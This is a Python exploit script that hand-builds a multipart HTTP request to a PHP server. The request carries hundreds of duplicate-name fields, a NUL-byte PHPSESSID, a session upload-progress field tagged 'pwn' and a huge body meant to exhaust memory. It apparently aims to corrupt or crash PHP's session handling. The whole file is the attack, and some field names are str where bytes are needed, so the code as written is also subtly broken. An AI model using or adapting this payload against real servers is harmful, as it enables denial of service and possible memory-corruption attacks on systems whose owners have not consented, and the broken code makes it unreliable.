#!/usr/bin/env python3
"""A with NV duplicate-name fields (all name 'a', value 'x') to keep $_POST
small and push PS(id) lower; then NUL PHPSESSID, progress, file, huge OOM.
usage: send_a_dup.py NV HUGE [NAME]
"""
import socket,sys
NV=int(sys.argv[1]); HUGE=int(sys.argv[2]) if len(sys.argv)>2 else 12
NAME=(sys.argv[3] if len(sys.argv)>3 else 'a').encode()
BND=b'S'*17
parts=[]
for i in range(NV):
    parts.append({'n':NAME,'d':b'x'})
parts.append({'n':'PHPSESSID','d':b'\x00'})
parts.append({'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'})
parts.append({'n':'f','filename':'a.txt','d':b'A'*64})
parts.append({'n':'big','d':b'B'*(HUGE*1024*1024)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n']+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
